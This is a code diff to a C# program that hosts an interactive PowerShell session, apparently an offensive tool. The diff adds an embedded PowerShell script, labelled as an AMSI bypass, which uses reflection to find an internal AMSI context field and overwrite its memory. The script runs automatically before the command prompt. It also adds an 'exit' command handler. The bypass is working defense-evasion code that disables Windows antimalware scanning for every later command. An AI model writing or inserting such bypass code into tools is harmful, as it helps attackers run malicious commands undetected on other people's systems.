@@ -42,6 +42,30 @@
                 
                 Console.WriteLine("PS " + currentDirectory + ">");
 
+                // AMSI bypass code
+                string amsiBypass = @"
+                $a=[Ref].Assembly.GetTypes(); 
+                Foreach($b in $a) {
+                    if ($b.Name -like ""*iUtils"") {
+                        $c=$b
+                    }
+                };
+                $d=$c.GetFields('NonPublic,Static');
+                Foreach($e in $d) {
+                    if ($e.Name -like ""*Context"") {
+                        $f=$e
+                    }
+                };
+                $g=$f.GetValue($null);
+                [IntPtr]$ptr=$g;
+                [Int32[]]$buf = @(0);
+                [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);
+                ";
+
+                // Add the AMSI bypass script to the session
+                ps.AddScript(amsiBypass);
+                ps.Invoke();
+
                 while (true)
                 {
                     Console.Write("PS " + currentDirectory + "> ");
@@ -50,6 +74,13 @@
 
                     try
                     {
+                        // Handle 'exit' command separately
+                        if (cmd.Trim().ToLower() == "exit")
+                        {
+                            Console.WriteLine("Exiting PowerShell session...");
+                            break;  // Breaks the loop and ends the session
+                        }
+
                         // Handle directory navigation commands
                         if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
                         {
@@ -67,7 +98,7 @@
                             continue;
                         }
 
-                        // Add the Out-String cmdlet to ensure proper formatting
+                        // Add the Out-String cmdlet to ensure proper formatting for other commands
                         ps.AddScript(cmd + " | Out-String");
                         Collection<PSObject> psOutput = ps.Invoke();
                         Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();
